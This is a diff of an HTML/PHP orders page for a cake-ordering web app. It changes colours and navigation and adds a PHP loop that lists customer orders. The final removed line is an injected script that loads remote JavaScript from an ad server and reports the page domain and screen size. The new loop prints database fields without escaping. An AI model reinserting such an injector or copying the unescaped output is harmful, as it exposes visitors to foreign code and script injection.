@@ -18,7 +18,7 @@
   <title>Service Cake</title>
 
   <!-- Favicons-->
-  <link rel="icon" href="../material/images/favicon/favicon-32x32.png" sizes="32x32">
+  <link rel="icon" href="../material/images/favicon/" sizes="32x32">
   <!-- Favicons-->
   <link rel="apple-touch-icon-precomposed" href="../material/images/favicon/apple-touch-icon-152x152.png">
   <!-- For iPhone -->
@@ -44,16 +44,22 @@
   <link href="../material/js/plugins/perfect-scrollbar/perfect-scrollbar.css" type="text/css" rel="stylesheet" media="screen,projection">
   <link href="../material/js/plugins/data-tables/css/jquery.dataTables.min.css" type="text/css" rel="stylesheet" media="screen,projection">
   <link href="../material/js/plugins/chartist-js/chartist.min.css" type="text/css" rel="stylesheet" media="screen,projection">
+ <script>
+  $(document).ready(function() {
+    $('select').material_select();
+  });
+  </script>
+
 </head>
 
 <body>
   <!-- Start Page Loading -->
-  <div id="loader-wrapper">
+  <!-- <div id="loader-wrapper">
       <div id="loader"></div>        
       <div class="loader-section section-left"></div>
       <div class="loader-section section-right"></div>
   </div>
-  <!-- End Page Loading -->
+   --><!-- End Page Loading -->
 
   <!-- //////////////////////////////////////////////////////////////////////////// -->
 
@@ -62,15 +68,13 @@
         <!-- start header nav-->
         <div class="navbar-fixed">
            <nav class="cyan">
-                <div class="nav-wrapper" style="background-color:#1abc9c;">                    
+                <div class="nav-wrapper" style="background-color:#03A9F4;">                    
                     
                     <ul class="left">                      
-                      <li><h1 class="logo-wrapper"><a class="brand-logo darken-1"><img src="../material/images/bk.png" alt="materialize logo"></a> <span class="logo-text">Materialize</span></h1></li>
+                      <li><h1 class="logo-wrapper"><a class="brand-logo darken-1"><img src="../material/images/bk.png" alt="Service Cake"></a> <span class="logo-text">Materialize</span></h1></li>
                     </ul>
                     <ul class="right hide-on-med-and-down">                        
-                        <li><a href="javascript:void(0);" class="waves-effect waves-block waves-light toggle-fullscreen"><i class="mdi-action-settings-overscan"></i></a>
-                        </li>                       
-                        <li><a href="{{ ('pesan/pesan') }}" class="waves-effect waves-block waves-light"><i class="mdi-action-perm-identity"></i>
+                        <li><a href="/masuk" class="waves-effect waves-block waves-light"><i class="mdi-action-perm-identity"></i>
                         </li>                        
                     </ul>
                 </div>
@@ -80,7 +84,7 @@
                 <div class="nav-wrapper">                  
                   <ul id="nav-mobile" class="left hide-on-med-and-down">
                     <li>
-                        <a href="{{ ('theme') }}" class="cyan-text">
+                        <a href="{{ ('/') }}" class="cyan-text">
                             <i class="mdi-action-dashboard"></i>
                             <span>Home</span>
                         </a>
@@ -88,7 +92,7 @@
                     <li class="active">
                         <a href="{{ ('data') }}" class="cyan-text">
                             <i class="mdi-communication-email"></i>
-                            <span>Data Pesanan</span>
+                            <span>Data Pemesanan</span>
                         </a>
                     </li>                    
                     <li>
@@ -97,6 +101,13 @@
                             <span>Pesan Kue</span>
                         </a>
                     </li>
+                    <li>
+                        <a href="{{ ( 'daftarkue' ) }}" class="cyan-text">
+                            <i class="mdi-action-book"></i>
+                            <span>Daftar Kue</span>
+                        </a>
+                    </li>
+                
                 </div>
               </nav>
                 <!-- CSSdropdown -->
@@ -179,20 +190,40 @@
 
                 <div class="col s12">
                   <table id="data-table-simple" class="centered display" cellspacing="0">
-                    <thead style="background-color:#1abc9c; color:white;">
+                    <thead style="background-color:#0288D1; color:white;">
                         <tr>
                     <th>No</th>
                     <th>Nama Pemesan</th>
                     <th>No Telp</th>
-                    <th>Pesanan</th>
                     <th>Kue</th>
-                    <th>Ukuran</th>
-                    <th>Gambar</th>
+                    <th>jumlah</th>
                     <th>Keterangan</th>
                     <th>Aksi</th>
                         </tr>
                     </thead>
-                   --></table>
+
+                    <tbody>
+                    <?php 
+      $i=1;
+      foreach($pesan as $key){
+      ?>
+                        <tr>
+                  <td><?php echo $i;?></td>
+                  <td><?php echo $key['pmsn'];?></td>
+                  <td><?php echo $key['no_tlp'];?></td>
+                  <td><?php echo $key['ciri_kue'];?></td>
+                  <td><?php echo $key['jmlh'];?></td>
+                  <td><?php echo strtoupper($key['status']);?></td>
+                  <td><a href="{{ ('data/detail/'.$key['id']) }}">
+                  <img src="material/images/edit.png"> <font color="#1abc9c">Detail</font></a></td>
+                        </tr>
+                        <?php
+                $i++;
+                 }
+        ?>
+                    </tbody>
+              
+                   </table>
                 </div>
               </div>
             </div> 
@@ -227,7 +258,7 @@
 
   <!-- START FOOTER -->
   <footer class="page-footer">
-    <div class="footer-copyright" style="background-color:#1abc9c;">
+    <div class="footer-copyright" style="background-color:#03A9F4;">
       <div class="container">
         <span>CopyRight © 2016 Projetct</span>
         <span class="right"></span>
@@ -258,6 +289,5 @@
     
     <!--plugins.js - Some Specific JS codes for Plugin Settings-->
     <script type="text/javascript" src="../material/js/plugins.js"></script>    
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b4yDpHVxutTfQDznvLTftrdyvhNH57V27XZkY%2fJKSF%2bMSqStnFc2xWQGZg45rrQ7Yvb57gL6K4lTLMLD1NIXJSjyoLH1pIXnj2dk2dViaECJKvi8UwP9CV4r8sdsiuVSjSZI2S0HyTFno6GoJObfKMu5R5hC55VDN8blRGQMMloMGfwR2gmw4RHtpzlvlZIOhFcWjYcv1ieR6RBo2ZkCB836wuHUR%2bn%2b92e%2fn6TSUPm50v4grSWtoa8izYTs1LiVI9ydGsYLBjq53omv2hUz1wn3l1Xujx0nVMxpLCT2XtkwpVMfqyIv7MEo2r0yWlDhaQNwJvqBWQxlfHSep3MT5WKBpFT7LMblgkCuIXUTVuMNhwJF1zr1myej%2fP9OX81zCi2jfJbDhGZXdxmHQOeVBS6UQAWQFRGrZ1bndXlmFsNx8nJWguSbJa%2bSVdh3%2bDdHiD67%2f0qCPYOGiNyltM6jTbFNVt3EcTZDurGZxud1APu8zkW%2fhP3LZsxxWr4vNuRnaVOWYsgO66I27GCWO010CE5Gb4ElgRIB97E%2fgjOsK2cKv9upSK7m3QeFuyOnLuJgqAvgl3%2bDOVa0nEOdU5FOtSaTCe9mgGfOmFMz1NXdwowWiWllFQ%2bx6irEko8vSNAZEULF6QeqKenE9mK243A%2boBBgmgGYNrQ3cO4XiHzAHlxQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 </html>
